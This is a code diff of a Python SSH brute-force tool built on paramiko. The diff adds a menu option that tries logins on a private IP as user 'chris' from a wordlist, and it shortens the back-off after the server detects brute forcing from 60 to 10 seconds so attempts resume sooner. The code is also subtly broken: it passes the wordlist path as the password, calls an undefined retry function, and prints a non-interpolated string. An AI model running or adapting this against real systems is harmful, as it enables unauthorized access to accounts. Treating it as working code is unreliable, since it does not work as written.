@@ -8,15 +8,17 @@
 
 import paramiko, time, socket
 
-global target, username, password
-target = 192.168.18.73
-username = chris
+global host, user, pass_file
+host = "192.168.18.73"
+user = "chris"
+pass_file = "/home/vmubuntu/wordlist/cracker.txt"
 
 def menu():
     print ("\nwhat would you like to do?\n")
     print ("1) Dictionary Iterator")
     print ("2) Password Recognizer")
-    print ("3) Exit")
+    print ("3) Brute force SSH")
+    print ("4) Exit")
     choice = input()
     return choice
 
@@ -28,8 +30,10 @@ def action(choice):
         recognizer()
     
     elif choice == "3":
-        exit()
+        connection(host, user, pass_file)
     
+    elif choice == "4":
+        exit()
     else:
         print ("\nPlease choose among the options")
         
@@ -82,14 +86,14 @@ def recognizer():
     f.close()
 
 #Look for the right password with given exceptions                        
-def connection(target,username, password):
+def connection(host, username=user, password=pass_file):
    initialize = paramiko.SSHClient()
    #Initialize ssh client
    initialize.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #Add to know hosts 
       
    try:
-       initialize.connect(target, port=22, username, password=password)
+       initialize.connect(host, port=22, username=user, password=pass_file)
 
    except paramiko.AuthenticationException:
    #Failed authentication by credentials    
@@ -104,9 +108,9 @@ def connection(target,username, password):
    except paramiko.SSHException:
    #Server detected brute force attack so we stop.
         print("[!] Too many attempts, retrying in 1 minute...")
-        time.sleep(60)
+        time.sleep(10)
         #Sleep for a minute
-        return retry(target, username, password)
+        return retry(host, username, password)
         #Continue brute forcing server
    else:    
        print("\n[*] Password cracked {password}")
